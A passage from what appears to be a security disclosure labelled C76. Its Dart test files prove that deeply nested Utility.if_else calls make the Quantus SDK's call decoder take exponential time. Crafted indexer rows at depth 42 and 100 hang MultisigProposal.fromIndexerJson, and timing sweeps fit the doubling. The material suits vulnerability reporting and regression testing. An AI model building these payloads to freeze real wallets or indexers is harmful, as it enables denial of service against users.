String _humanise(double seconds) {
  if (seconds < 1) return '${(seconds * 1000).toStringAsFixed(0)}ms';
  if (seconds < 60) return '${seconds.toStringAsFixed(1)}s';
  if (seconds < 3600) return '${(seconds / 60).toStringAsFixed(1)}min';
  if (seconds < 86400) return '${(seconds / 3600).toStringAsFixed(1)}h';
  if (seconds < 86400 * 365) return '${(seconds / 86400).toStringAsFixed(1)}d';
  return '${(seconds / 86400 / 365).toStringAsFixed(1)}y';
}

void main() {
  group('Utility.if_else conversion cost scales as 2^depth', () {
    test('sweep $_sweepStart..$_sweepEnd fits the doubling recurrence and projects depth $_reportedDepth', () async {
      // Warm the converter so the first measured depth is not paying for JIT.
      await _timeDecode(_encode(_warmupDepth));

      final depths = <int>[];
      final micros = <double>[];

      for (var depth = _sweepStart; depth <= _sweepEnd; depth++) {
        final bytes = _encode(depth);
        // Repeat and take the median. A single sample per depth is noisy enough
        // on a shared machine to move the fitted slope by several percent.
        final runs = <double>[];
        for (var r = 0; r < _repeats; r++) {
          runs.add((await _timeDecode(bytes)).inMicroseconds.toDouble());
        }
        runs.sort();
        final us = runs[runs.length ~/ 2];
        final traversals = _mainTraversalCount(depth);
        depths.add(depth);
        micros.add(us);
        debugPrint(
          'C76 scaling: depth=$depth bytes=${bytes.length} '
          'traversals=$traversals median_of_$_repeats=${us.toStringAsFixed(0)}us '
          'per_traversal=${(us * 1000 / traversals.toDouble()).toStringAsFixed(1)}ns '
          'samples=${runs.map((v) => v.toStringAsFixed(0)).join(",")}',
        );
      }

      // Least squares on log2(microseconds) against depth. The recurrence
      // predicts a slope of 1.0 — each additional level doubles the work.
      final fitIdx = <int>[for (var i = 0; i < depths.length; i++) if (depths[i] >= _fitFrom) i];
      final n = fitIdx.length;
      final xs = [for (final i in fitIdx) depths[i].toDouble()];
      final ys = [for (final i in fitIdx) math.log(micros[i]) / math.ln2];
      final meanX = xs.reduce((a, b) => a + b) / n;
      final meanY = ys.reduce((a, b) => a + b) / n;
      var sxy = 0.0, sxx = 0.0, syy = 0.0;
      for (var i = 0; i < n; i++) {
        sxy += (xs[i] - meanX) * (ys[i] - meanY);
        sxx += (xs[i] - meanX) * (xs[i] - meanX);
        syy += (ys[i] - meanY) * (ys[i] - meanY);
      }
      final slope = sxy / sxx;
      final r2 = (sxy * sxy) / (sxx * syy);

      // The fit's job is to confirm the doubling. The projection itself comes
      // from the mean per-traversal cost on the converged plateau, which is far
      // less sensitive to run-to-run noise than extrapolating the intercept.
      var rateSum = 0.0;
      for (final i in fitIdx) {
        rateSum += micros[i] * 1000 / _mainTraversalCount(depths[i]).toDouble();
      }
      final nsPerTraversal = rateSum / n;
      final projectedSeconds =
          _mainTraversalCount(_reportedDepth).toDouble() * nsPerTraversal / 1e9;

      debugPrint(
        'C76 scaling fit: fitted_from=$_fitFrom points=$n slope=${slope.toStringAsFixed(4)} '
        'r2=${r2.toStringAsFixed(6)} '
        'ns_per_traversal=${nsPerTraversal.toStringAsFixed(2)} '
        'projected_depth=$_reportedDepth projected=${_humanise(projectedSeconds)}',
      );

      // The recurrence is 3*2^d - 2, so growth must be a per-level doubling.
      // The bands are wide enough to survive a loaded machine and still narrow
      // enough to exclude any non-exponential growth: a linear or quadratic
      // cost would put the slope near zero, and a cubic one far above 1.
      expect(slope, closeTo(1.0, 0.15), reason: 'measured growth is not a per-level doubling');
      expect(r2, greaterThan(0.98), reason: 'measurements do not fit a clean exponential');
      expect(projectedSeconds, greaterThan(86400.0), reason: 'projection should exceed a day');
    }, timeout: const Timeout(Duration(minutes: 20)));

    test('depth $_acceptanceDepth enters the conversion and does not leave it', () async {
      final call = _mainNestedIfElse(_acceptanceDepth);
      final bytes = Uint8List.fromList(RuntimeCall.codec.encode(call));

      // The bytes are canonical and small: 3 + 5*depth.
      expect(bytes, orderedEquals(_canonicalMainEncoding(_acceptanceDepth)));
      expect(bytes.length, 3 + 5 * _acceptanceDepth);
      expect(bytes.length, lessThan(10240), reason: 'must fit the runtime max_call_size');

      final traversals = _mainTraversalCount(_acceptanceDepth);
      final completedIn = await _decodeOrTimeout(bytes, _acceptanceDeadline);

      debugPrint(
        'C76 acceptance: depth=$_acceptanceDepth bytes=${bytes.length} '
        'traversals=$traversals watchdog=${_acceptanceDeadline.inSeconds}s '
        'result=${completedIn == null ? "did-not-complete" : "completed_in=${completedIn.inMicroseconds}us"} '
        'worker=terminated',
      );

      expect(
        completedIn,
        isNull,
        reason: 'the conversion returned; the projection below would not hold',
      );
    }, timeout: const Timeout(Duration(minutes: 5)));
  });
}
```

</details>

<details>

<summary><code>indexer_row_test.dart</code> — the production SDK factory on one indexer-shaped row</summary>

```dart
// C76 — the production indexer-row path, not the decoder in isolation.
//
// poc_test.dart calls CallDecoder.decodeBytes directly. This file instead runs
// the SDK factory the application uses to turn one GraphQL row from the
// project's indexer into a MultisigProposal, on an ACTIVE row using the
// relevant fields selected by the MultisigOpenProposals query: no
// transfer_amount, no transferTo, and call_raw carrying the stored bytes.
//
// MultisigProposal.fromIndexerJson decodes call_raw itself in that case, so the
// conversion happens while the response is being parsed — before the proposal
// row renders and before the authoritative-storage enrichment runs.
//
// Nothing here touches a network, a node, an indexer or any account. The work
// runs on a worker isolate purely so the test can bound it and clean up.

import 'dart:async';
import 'dart:isolate';
import 'dart:typed_data';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/generated/planck/pallets/system.dart' as system_pallet;
import 'package:quantus_sdk/generated/planck/pallets/utility.dart' as utility_pallet;
import 'package:quantus_sdk/generated/planck/types/quantus_runtime/runtime_call.dart';
import 'package:quantus_sdk/src/models/multisig_account.dart';
import 'package:quantus_sdk/src/models/multisig_proposal.dart';

const _controlDepth = 16;
const _targetDepth = 42;
const _deeperDepth = 100;
const _controlDeadline = Duration(seconds: 60);
const _targetDeadline = Duration(seconds: 10);
const _deeperDeadline = Duration(seconds: 30);
const _workerStartDeadline = Duration(seconds: 10);
const _workerExitDeadline = Duration(seconds: 10);

const _multisigId = '5Dq3FfTuqBwjPtEcbcRAjaGYCJXjfg6DXCTdM8YMhmJtVjqB';
const _signerA = '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY';
const _signerB = '5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty';

MultisigAccount _msig() => MultisigAccount(
  name: 'C76',
  accountId: _multisigId,
  signers: const [_signerA, _signerB],
  threshold: 2,
  nonce: BigInt.zero,
  myMemberAccountId: _signerB,
);

RuntimeCall _remark() => const system_pallet.Txs().remark(remark: []);

/// Nesting in `main` — the shape the decoder describes twice per level.
RuntimeCall _mainNested(int depth) {
  final leaf = _remark();
  RuntimeCall call = leaf;
  for (var level = 0; level < depth; level++) {
    call = const utility_pallet.Txs().ifElse(main: call, fallback: leaf);
  }
  return call;
}

String _hex(RuntimeCall call) {
  final bytes = Uint8List.fromList(RuntimeCall.codec.encode(call));
  return '0x${bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join()}';
}

/// One ACTIVE row using the relevant fields the MultisigOpenProposals query
/// selects. For a stored call that is not a plain transfer the transfer columns
/// are absent and call_raw carries the bytes.
Map<String, dynamic> _indexerRow(String callRawHex) => <String, dynamic>{
  'id': 'c76-row-1',
  'proposal_id': 1,
  'proposer': <String, dynamic>{'id': _signerA},
  'created_at': '2026-08-12T00:00:00Z',
  'updated_at': '2026-08-12T00:00:00Z',
  'pallet': 'Utility',
  'call': 'if_else',
  'call_raw': callRawHex,
  'expiry_block': 100800,
  'approvals': <String>[_signerA],
  'deposit': '0',
  'status': 'ACTIVE',
};

@pragma('vm:entry-point')
void _parseWorker(List<Object> message) {
  final startedPort = message[0] as SendPort;
  final resultPort = message[1] as SendPort;
  final callRawHex = message[2] as String;

  startedPort.send('started');
  try {
    final proposal = MultisigProposal.fromIndexerJson(_indexerRow(callRawHex), msig: _msig());
    resultPort.send(<String, Object>{
      'event': 'completed',
      'pallet': proposal.pallet,
      'call': proposal.call,
      'status': proposal.status.name,
    });
  } catch (error, stackTrace) {
    resultPort.send(<String, Object>{'event': 'error', 'error': '$error', 'stackTrace': '$stackTrace'});
  }
}

/// Returns the parsed row, or null when parsing did not finish before [deadline].
Future<Map<Object?, Object?>?> _parseOrTimeout(String callRawHex, Duration deadline) async {
  final startedPort = ReceivePort();
  final resultPort = ReceivePort();
  final exitPort = ReceivePort();
  Isolate? worker;
  Map<Object?, Object?>? completed;

  try {
    worker = await Isolate.spawn<List<Object>>(
      _parseWorker,
      <Object>[startedPort.sendPort, resultPort.sendPort, callRawHex],
      debugName: 'c76-indexer-row-worker',
      errorsAreFatal: true,
      onError: resultPort.sendPort,
      onExit: exitPort.sendPort,
    );

    await startedPort.first.timeout(_workerStartDeadline);
    try {
      final raw = await resultPort.first.timeout(deadline);
      if (raw is! Map<Object?, Object?> || raw['event'] != 'completed') {
        throw StateError('worker failed before completing the parse: $raw');
      }
      completed = raw;
    } on TimeoutException {
      completed = null;
    }
  } finally {
    worker?.kill(priority: Isolate.immediate);
    if (worker != null) {
      await exitPort.first.timeout(
        _workerExitDeadline,
        onTimeout: () => throw StateError('worker did not confirm exit after kill'),
      );
    }
    startedPort.close();
    resultPort.close();
    exitPort.close();
  }

  return completed;
}

void main() {
  group('One indexer row is enough to stop the SDK parsing it', () {
    test('a depth-$_controlDepth row parses normally through the same factory', () async {
      final row = _hex(_mainNested(_controlDepth));
      final parsed = await _parseOrTimeout(row, _controlDeadline);

      debugPrint(
        'C76 indexer row: depth=$_controlDepth hex_chars=${row.length} '
        'result=${parsed == null ? "did-not-complete" : "parsed pallet=${parsed['pallet']} "
            "call=${parsed['call']} status=${parsed['status']}"}',
      );

      expect(parsed, isNotNull, reason: 'the control row must parse, or the comparison below is empty');
      expect(parsed!['pallet'], 'Utility');
      expect(parsed['call'], 'if_else');
      expect(parsed['status'], 'active');
    }, timeout: const Timeout(Duration(minutes: 3)));

    test('a depth-$_targetDepth row does not finish parsing', () async {
      final row = _hex(_mainNested(_targetDepth));
      expect(row.length, 2 + 2 * (3 + 5 * _targetDepth), reason: '0x plus two hex chars per byte');

      final parsed = await _parseOrTimeout(row, _targetDeadline);

      debugPrint(
        'C76 indexer row: depth=$_targetDepth hex_chars=${row.length} '
        'watchdog=${_targetDeadline.inSeconds}s '
        'result=${parsed == null ? "did-not-complete" : "parsed"} worker=terminated',
      );

      expect(
        parsed,
        isNull,
        reason: 'the depth-$_targetDepth row unexpectedly completed parsing before the deadline',
      );
    }, timeout: const Timeout(Duration(minutes: 3)));

    test('a depth-$_deeperDepth row does not finish parsing either', () async {
      final row = _hex(_mainNested(_deeperDepth));
      expect(row.length, 2 + 2 * (3 + 5 * _deeperDepth), reason: '0x plus two hex chars per byte');

      final parsed = await _parseOrTimeout(row, _deeperDeadline);

      debugPrint(
        'C76 indexer row: depth=$_deeperDepth hex_chars=${row.length} '
        'watchdog=${_deeperDeadline.inSeconds}s '
        'result=${parsed == null ? "did-not-complete" : "parsed"} worker=terminated',
      );

      expect(
        parsed,
        isNull,
        reason: 'the depth-$_deeperDepth row unexpectedly completed parsing before the deadline',
      );
    }, timeout: const Timeout(Duration(minutes: 3)));
  });
}
```

</details>
